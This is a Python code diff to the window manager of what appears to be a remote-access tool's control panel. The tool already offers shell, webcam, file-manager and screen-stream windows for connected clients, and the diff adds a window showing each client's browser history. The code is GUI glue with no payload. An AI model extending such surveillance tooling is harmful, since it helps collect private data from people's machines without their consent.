@@ -8,6 +8,7 @@ from gui.shell_view import ShellWindow
 from gui.file_manager_view import FileManagerWindow
 from gui.webcam_view import WebcamWindow
 from gui.screen_stream_view import ScreenStreamWindow
+from gui.browser_history_view import BrowserHistoryWindow
 import core.protocol
 import json
 logger = logging.getLogger("server.window_manager")
@@ -21,7 +22,8 @@ class WindowManager:
         self.shell_windows = {}
         self.file_manager_windows = {}
         self.webcam_windows = {}
-        self.screen_stream_windows = {}  # Novo dicionário para janelas de stream de tela
+        self.screen_stream_windows = {}
+        self.browser_history_windows = {}  # Novo dicionário para janelas de histórico
         self.closing_windows = set()
     def display_screenshot(self, client_address, screenshot_data):
         client_key = f"{client_address[0]}:{client_address[1]}"
@@ -364,6 +366,15 @@ class WindowManager:
                     except:
                         pass
             self.screen_stream_windows.clear()
+        if hasattr(self, 'browser_history_windows'):
+            for client_key, window_info in list(self.browser_history_windows.items()):
+                if "window" in window_info and hasattr(window_info["window"], "winfo_exists"):
+                    try:
+                        if window_info["window"].winfo_exists():
+                            window_info["window"].destroy()
+                    except:
+                        pass
+            self.browser_history_windows.clear()
         self.screenshot_windows.clear()
         self.process_windows.clear()
         self.shell_windows.clear()
@@ -459,3 +470,66 @@ class WindowManager:
             self.server.log(f"Resposta de streaming de tela para {client_key}: {response_text}")
         except Exception as e:
             self.server.log(f"Erro ao processar resposta de streaming de tela: {str(e)}")
+    def open_browser_history_window(self, client_address):
+        client_key = f"{client_address[0]}:{client_address[1]}"
+        if client_key in self.closing_windows:
+            self.server.log(f"Removendo {client_key} da lista de fechamento para permitir novo histórico")
+            self.closing_windows.discard(client_key)
+        if client_key in self.browser_history_windows:
+            window_info = self.browser_history_windows[client_key]
+            if "window" in window_info and hasattr(window_info["window"], "winfo_exists"):
+                try:
+                    if window_info["window"].winfo_exists():
+                        window_info["window"].focus_set()
+                        return window_info["window"]
+                except:
+                    pass
+        try:
+            history_window = BrowserHistoryWindow(
+                self.main_window,
+                client_address,
+                client_key,
+                self.server,
+                self.server.log
+            )
+            self.browser_history_windows[client_key] = {
+                "window": history_window.window,
+                "process_history_data": history_window.process_history_data
+            }
+            return history_window.window
+        except Exception as e:
+            self.server.log(f"Erro ao criar janela de histórico: {str(e)}")
+            return None
+    def process_browser_history_response(self, client_address, data):
+        client_key = f"{client_address[0]}:{client_address[1]}"
+        if client_key in self.closing_windows:
+            return
+        history_window_exists = False
+        history_window = None
+        if client_key in self.browser_history_windows:
+            window_info = self.browser_history_windows[client_key]
+            if "window" in window_info and hasattr(window_info["window"], "winfo_exists"):
+                try:
+                    if window_info["window"].winfo_exists():
+                        history_window_exists = True
+                        history_window = window_info
+                except:
+                    pass
+        if not history_window_exists:
+            try:
+                window = self.open_browser_history_window(client_address)
+                if window and client_key in self.browser_history_windows:
+                    history_window = self.browser_history_windows[client_key]
+                    history_window_exists = True
+            except:
+                pass
+        if not history_window_exists:
+            self.server.log(f"Recebida resposta de histórico para {client_key}, mas nenhuma janela foi encontrada")
+            return
+        try:
+            if "process_history_data" in history_window and callable(history_window["process_history_data"]):
+                history_window["process_history_data"](data)
+            else:
+                self.server.log(f"Método de processamento de histórico não encontrado para {client_key}")
+        except Exception as e:
+            self.server.log(f"Erro ao processar resposta de histórico: {str(e)}")
